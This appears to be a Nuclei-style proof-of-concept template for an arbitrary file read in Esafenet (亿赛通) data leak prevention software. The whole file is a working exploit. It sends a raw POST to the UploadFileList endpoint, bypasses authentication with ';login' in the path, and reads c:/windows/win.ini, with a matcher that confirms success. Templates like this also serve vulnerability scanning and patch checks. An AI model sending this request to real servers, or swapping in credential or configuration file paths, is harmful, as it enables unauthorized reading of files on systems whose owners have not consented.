id: poc-1000660714
info:
  name: 亿赛通 数据泄露防护 UploadFileList login接口任意文件读取漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: file-upload,lfi,unknown
http:
- raw:
  - 'POST /CDGServer3/document/UploadFileList;login HTTP/1.1


    Accept-Encoding: gzip, deflate


    Accept: */*


    Connection: close


    Content-Type: application/x-www-form-urlencoded


    command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=hello


    # 响应代码特征

    200


    # 响应内容特征

    app


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
